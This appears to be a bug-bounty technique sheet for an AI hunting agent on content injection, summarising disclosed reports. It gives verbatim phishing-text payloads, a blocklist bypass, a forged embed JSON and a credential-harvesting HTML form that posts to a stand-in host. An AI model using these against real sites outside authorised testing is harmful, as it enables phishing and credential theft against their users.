---
name: hunter-l3-content-injection
description: "Use when hunting Content Injection on a target. Loads the L3 technique sheet: Content injection is the reflection of attacker-controlled text or markup into a trusted host's response — not XSS (no script execution proven), but visible, attacker-authored content rendered under t"
domain: cybersecurity
subdomain: web
tags:
- web
- content-injection
- hunting
- l3
version: '1.0'
---

# Content Injection — Technique Sheet

## Overview
Content injection is the reflection of attacker-controlled text or markup into a trusted host's response — not XSS (no script execution proven), but visible, attacker-authored content rendered under the target's domain, padlock, and branding. It pays when the reflected surface is a high-trust page (login pages, error/404 pages, official media players, app render surfaces) because the injected text becomes a ready-made phishing lure: "this site has moved, go here instead." Several of these were accepted on major programs (Coinbase, DoD, Mattermost, Automattic) purely on spoofing/social-engineering impact, so don't dismiss them as "self-XSS without execution."

## Distinct sub-patterns

### 1. Login page `error` parameter reflection (WordPress wp-login.php)
- Endpoint shape: `GET /wp-login.php?error=<attacker text>`
- Payload (verbatim): `https://withinsecurity.com/wp-login.php?error=Please log in through prashanthvarma.in`
- Root cause: the `error` parameter of wp-login.php is reflected into the rendered login page without sanitization or allowlisting of known error strings.
- Impact: arbitrary text displayed on the login page — a credible spoof since users expect error messages there ("Please log in through <attacker domain>").
- Exemplars: 102327 (withinsecurity)

### 2. 404 / error page path reflection
The largest cluster (4 records). The URL path is echoed verbatim into the error page body.
- Endpoint shapes:
  - `GET /{anything}` (404 page) — 138786 (Veris)
  - `GET /{anything}` on a subdomain — 145375 (stats.nextcloud.com), 148952 (images.coinbase.com)
  - `GET /diffusion/PHU/browse/master/{path}` — 36112 (Phabricator)
- Payloads (verbatim):
  - `http://veris.in/test/%2f../It has been changed by a new one https://www.crowdcurity.com so go to the new one since this one`
  - `https://stats.nextcloud.com/has%2f beed to https://www.ATTACKER.COM. so please visit https://www.ATTACKER.COM as your requested link`
  - `https://images.coinbase.com/has.been.changed.to.https://images.attacker.com/,so.please.visit.https://images.attacker.com`
  - `you are hacked mister Evan Priestley [ fool man ]`
- Root cause: error handlers print the raw requested path (URL-decoded) into the response body instead of a fixed message. Note the `%2f` encoding trick — used both to survive path routing normalization (so the malformed segment reaches the error handler) and to embed spaces/separators in a single path segment.
- Impact: attacker-chosen text rendered on the official domain, explicitly used as "this resource moved to ATTACKER.COM, visit it" phishing.
- Exemplars: 138786, 145375, 148952, 36112

### 3. WebDAV / API path reflection with partial filtering
- Endpoint shape: `GET /remote.php/dav/files/{user}/{path}`
- Payload (verbatim): `http://nextcloud_custom_URL/remote.php/dav/files/nxtgrpone2/The location of the files are moved to another url that could be found at fakenextcloud.com domain. Please visit the file at those new location with "sample fake file.txt"`
- Root cause: the DAV error page reflects the file path with only `/` filtered — everything else (spaces, quotes, full sentences, domain names) passes through.
- Impact: attacker text injected into an authenticated-looking Nextcloud error page; explicitly framed as a social-engineering primitive, not data exposure.
- Exemplar: 149798

### 4. Player/embed URL parameter → arbitrary remote content (SSRF-ish content injection)
- Endpoint shape: `GET /shared/widgets/popup.asp?url=<rss/xml url>` feeding a Flash video player
- Payload (verbatim): `http://█████/shared/widgets/popup.asp?url=//████/rss.xml`
- Root cause: the player fetches whatever document the `url` parameter names and renders its title/description/media with no allowlist. A naive filter blocks `http://` — bypassed with a protocol-relative `//host/rss.xml` URL (scheme inherited from the page).
- Impact: attacker-controlled video played inside the DoD-hosted player masquerading as USAF content; attacker-controlled title/description text; the player's own `DOWNLOAD (WMV)` link served an attacker file (`bad.bat`) to users — a working weaponized PoC.
- Exemplar: 195635 (U.S. Dept of Defense)

### 5. Unsanitized embed metadata via API/WebSocket (Mattermost permalink/YouTube embeds)
- Endpoint shape: `POST /api/v4/posts` with `metadata[embeds]` in the body
- Payload (verbatim, truncated): `{"embeds":[{"type":"permalink","data":{"post_id":"96nffx8oztncuyyxq7nj7p8seh","post":{"id":"96nffx8oztncuyyxq7nj7p8seh","user_id":"teur4prbifnh7dhq5rh3cp7q4c","channel_id":"doesnt-matter","root_id":"","original_id":"","message":"This can be whatever i want","type":"","props":{},"hashtags":"","reply_...`
- Root cause: posts delivered over WebSocket are not sanitized/validated the same way as posts saved to the database, so client-side embed rendering trusts attacker-supplied metadata objects (fabricated `post`, `user_id`, `channel_id`, `message`).
- Impact: three distinct proofs — (a) fabricated permalink embeds showing fake user/channel/message content attributed to the platform; (b) a non-string `message` value in the embed crashed the web/desktop app (DoS); (c) a fully customizable YouTube embed used for phishing.
- Exemplar: 2541027 (Mattermost)

### 6. Markup injection in a rich-note editor (HTML form embedding)
- Surface: Simplenote Android note editor (note markup, not a URL parameter)
- Payload (verbatim, truncated): `<form action="https://example.com/login.php" id="login" name="login"><fieldset class="classic-fieldset" style="border:none;"><div class="input-fields"><p style="margin-right: 10px;"><label for="email">Email</label><input id="email" name="email" placeholder="Email" required="" style="padding: 0.3em;f...`
- Root cause: improper markup sanitization allows fully-fledged HTML `<form>` elements (with inline styling to look native) inside note content.
- Impact: credential-harvesting form rendered inside the trusted app; any user input is submitted to the attacker's server on form submit.
- Exemplar: 297479 → 297547 (Automattic)

## Bypass / chain notes
- URL-encoding tricks (`%2f`, `%20`, dots instead of slashes) get a single path segment past routing so the whole sentence reaches the error-page reflector; dots-as-separators (`has.been.changed.to.https://images.attacker.com/`) keep everything in one segment while remaining human-readable after reflection (148952).
- Protocol-relative URLs (`//host/path`) bypass scheme blocklists that only match `http://` or `https://` — decisive in the DoD player bug (195635).
- Partial filters leave wide holes: Nextcloud DAV filtered only `/` — spaces, quotes, and full sentences survived (149798).
- Chains observed: 195635 — direct request to `http://<attacker-host>/rss.xml` returned 403 (filter), switching to `//<attacker-host>/rss.xml` loaded the document, and the player's DOWNLOAD link then distributed an attacker file from the trusted host.
- Client-side trust split: server-side validation on save vs. no validation on the WebSocket fan-out path (2541027) — always test the *rendering* path, not just the write path.

## Gotchas / what NOT to do
- No script execution was proven in any record — these are content-spoofing/phishing findings, not XSS. Framing them as XSS without a working payload will get them closed; frame as content injection / phishing with the spoof text shown.
- Do not claim data access: several reporters explicitly noted "no sensitive data accessed" (148952, 149798) — impact rests on the spoof alone.
- Placeholder attacker infrastructure (ATTACKER.COM, fakenextcloud.com) is fine for the report, but a real hosted demonstration (e.g. the working `bad.bat` download in 195635) strengthens acceptance considerably.
- A non-string value in attacker-controlled metadata crashed the Mattermost client (2541027) — test type confusion in embeds, but be aware it crosses into DoS and should be demonstrated carefully.
- Low-value surfaces (arbitrary 404 pages on marketing sites) are frequently duplicates/known-broken — the accepted ones here were login pages, a DoD player, an authenticated DAV endpoint, and app render surfaces; target surfaces users already trust.

## Real-world impact examples
- DoD (195635): attacker video with attacker title/description played inside the official USAF-hosted player; the built-in DOWNLOAD (WMV) button served a malicious `bad.bat` file to users — a complete, working phishing/delivery chain.
- Mattermost (2541027): fabricated permalink embeds attributing fake messages to arbitrary users/channels; YouTube embed spoofing for phishing; and app crash (web + desktop) from a non-string embed field.
- Simplenote Android (297547): pixel-styled native-looking login form inside a note, submitting victim credentials to the attacker's server.
- Coinbase (148952): arbitrary text on the official images.coinbase.com error page redirecting users to attacker-controlled domains.
- Nextcloud (149798, 145375): "your files have moved to fakenextcloud.com" text on authenticated WebDAV error pages — targeted at users mid-workflow.
- Phabricator (36112), Veris (138786), withinsecurity (102327): arbitrary injected messages on core product pages, including a WordPress login page telling users to "log in through" an attacker domain.